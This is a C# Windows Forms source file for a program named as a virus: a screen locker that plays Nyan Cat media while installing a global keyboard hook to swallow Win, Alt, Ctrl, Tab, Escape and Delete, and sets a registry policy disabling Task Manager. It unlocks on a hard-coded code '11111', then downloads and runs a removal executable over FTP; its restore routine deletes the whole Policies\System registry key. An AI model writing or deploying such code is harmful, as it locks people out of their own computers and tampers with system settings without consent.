using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Media;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace VirusForm
{
    public partial class VirusShowForm : Form
    {
   // Structure contain information about low-level keyboard input event
   [StructLayout(LayoutKind.Sequential)]
   private struct KBDLLHOOKSTRUCT
   {
       public Keys key;
       public int scanCode;
       public int flags;
       public int time;
       public IntPtr extra;
   }
    
   //System level functions to be used for hook and unhook keyboard input
   private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
   [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
   private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
   [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
   private static extern bool UnhookWindowsHookEx(IntPtr hook);
   [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
   private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
   [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
   private static extern IntPtr GetModuleHandle(string name);
   [DllImport("user32.dll", CharSet = CharSet.Auto)]
   private static extern short GetAsyncKeyState(Keys key);
    
    
   //Declaring Global objects
   private IntPtr ptrHook;
   private LowLevelKeyboardProc objKeyboardProcess; 


        public VirusShowForm()
        {
             ProcessModule objCurrentModule = Process.GetCurrentProcess().MainModule; //Get Current Module
             objKeyboardProcess = new LowLevelKeyboardProc(captureKey); //Assign callback function each time keyboard process
             ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0); //Setting Hook of Keyboard Process for current module


            InitializeComponent();
            try
            {
                Random rnd = new Random();
                switch (rnd.Next(1, 4))
                {
                    case 1: pbGif.Image = VirusForm.Properties.Resources.nyan;
                        break;
                    case 2: pbGif.Image = VirusForm.Properties.Resources.Nyan_gitler;
                        break;
                    case 3: pbGif.Image = VirusForm.Properties.Resources.Nyan_problem;
                        break;
                }
          
                
                var player = new SoundPlayer(VirusForm.Properties.Resources.nyan_cat_loop);
                player.PlayLooping();
                KillCtrlAltDelete();
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }
            
        }
        private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
        {
            if (nCode >= 0)
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));

                if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin) { return (IntPtr)1; }
                if (objKeyInfo.key == Keys.Alt) { return (IntPtr)1; }
                if (objKeyInfo.key == Keys.Tab) { return (IntPtr)1; }
                if (objKeyInfo.key == Keys.LControlKey || objKeyInfo.key == Keys.RControlKey) { return (IntPtr)1; }
                if (objKeyInfo.key == Keys.F4) { return (IntPtr)1; }
                if (objKeyInfo.key == Keys.Delete) { return (IntPtr)1; }
                if (objKeyInfo.key == Keys.Escape) { return (IntPtr)1; }
                if (objKeyInfo.key == Keys.Pause) { return (IntPtr)1; }
                if (objKeyInfo.key == Keys.LMenu) { return (IntPtr)1; }
            }
            return CallNextHookEx(ptrHook, nCode, wp, lp);
        }

        public void KillCtrlAltDelete()
        {
            RegistryKey regkey;
            string keyValueInt = "1";
            string subKey = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";

            try
            {
                regkey = Registry.CurrentUser.CreateSubKey(subKey);
                regkey.SetValue("DisableTaskMgr", keyValueInt);
                regkey.Close();
            }
            catch (Exception ex)
            {
               // MessageBox.Show(ex.ToString());
            }
        }
        public static void EnableCTRLALTDEL()
        {
            try
            {
                string subKey = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
                RegistryKey rk = Registry.CurrentUser;
                RegistryKey sk1 = rk.OpenSubKey(subKey);
                if (sk1 != null)
                    rk.DeleteSubKeyTree(subKey);
            }
            catch (Exception ex)
            {
               // MessageBox.Show(ex.ToString());
            }
        }

       
      
        private void button1_Click(object sender, EventArgs e)
        {
            if (tbKey.Text == "11111")
            {
                try
                {
                    Network.DownloadFileFTP(VirusForm.Form1.needPatch, "DeleteVirus.exe");
                    EnableCTRLALTDEL();
                    Process dv = new Process();
                    dv.StartInfo.FileName = VirusForm.Form1.needPatch + "DeleteVirus.exe";
                    dv.Start();
                }
                catch { }
            }
        }




       
    }
}
